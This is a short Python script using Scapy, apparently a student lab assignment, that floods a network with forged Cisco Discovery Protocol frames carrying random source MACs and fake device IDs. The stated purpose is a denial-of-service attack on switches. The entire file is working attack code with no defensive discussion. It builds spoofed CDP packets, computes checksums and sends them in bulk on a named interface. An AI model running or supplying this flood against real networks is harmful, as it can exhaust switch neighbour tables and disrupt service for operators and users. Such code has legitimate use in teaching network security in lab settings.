#!/usr/bin/env python3
# ============================================
# CDP DoS Attack Script
# Autor: Sael German Garcia
# Matricula: 2025-0725
# ============================================

from scapy.all import *
import random
import struct
import sys

INTERFACE = "ens4"

def random_mac():
    first = random.randint(0, 255) & 0xFC
    return '%02x:%02x:%02x:%02x:%02x:%02x' % (
        first,
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
    )

def cdp_checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) | data[i + 1]
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def build_cdp_packet(src_mac):
    device_id = ''.join([chr(random.randint(65, 90)) for _ in range(8)])

    # TLV 0x0001 - Device ID
    tlv_device = struct.pack('!HH', 0x0001, 4 + len(device_id)) + device_id.encode()

    # TLV 0x0005 - Version (igual que SW1 real)
    version = b'Cisco IOS Software, Version 12.4'
    tlv_version = struct.pack('!HH', 0x0005, 4 + len(version)) + version

    # TLV 0x0006 - Platform
    platform = b'Linux Unix'
    tlv_platform = struct.pack('!HH', 0x0006, 4 + len(platform)) + platform

    # TLV 0x0002 - Addresses (vacio como SW1 real)
    tlv_addr = struct.pack('!HH', 0x0002, 8) + b'\x00\x00\x00\x00'

    # TLV 0x0003 - Port ID
    port = b'Ethernet0/0'
    tlv_port = struct.pack('!HH', 0x0003, 4 + len(port)) + port

    # TLV 0x0004 - Capabilities
    tlv_cap = struct.pack('!HHI', 0x0004, 8, 0x00000029)

    # TLV 0x0009 - VTP Domain (vacio como SW1 real)
    tlv_vtp = struct.pack('!HH', 0x0009, 4)

    # TLV 0x000a - Native VLAN
    tlv_vlan = struct.pack('!HHH', 0x000a, 6, 99)

    # TLV 0x000b - Duplex
    tlv_duplex = struct.pack('!HHB', 0x000b, 5, 0x01)

    cdp_payload = (tlv_device + tlv_version + tlv_platform +
                   tlv_addr + tlv_port + tlv_cap +
                   tlv_vtp + tlv_vlan + tlv_duplex)

    # Calcular checksum
    cdp_for_checksum = struct.pack('!BBH', 0x02, 0xb4, 0x0000) + cdp_payload
    chk = cdp_checksum(cdp_for_checksum)
    cdp_header = struct.pack('!BBH', 0x02, 0xb4, chk) + cdp_payload

    frame = (
        Ether(src=src_mac, dst='01:00:0c:cc:cc:cc') /
        LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
        SNAP(OUI=0x00000c, code=0x2000) /
        Raw(cdp_header)
    )
    return frame

def cdp_flood(interface, count):
    print("="*50)
    print("  CDP DoS Attack")
    print("  Autor: Sael German Garcia")
    print("  Matricula: 2025-0725")
    print("="*50)
    print(f"[*] Interfaz: {interface}")
    print(f"[*] Paquetes: {count}")
    print("[*] Iniciando...\n")

    for i in range(count):
        frame = build_cdp_packet(random_mac())
        sendp(frame, iface=interface, verbose=0)
        if (i+1) % 100 == 0:
            print(f"[+] Enviados: {i+1}/{count}")

    print(f"\n[+] Completado! {count} paquetes CDP enviados")
    print("[!] Verifica: show cdp neighbors")

if __name__ == "__main__":
    count = int(sys.argv[1]) if len(sys.argv) > 1 else 500
    cdp_flood(INTERFACE, count)
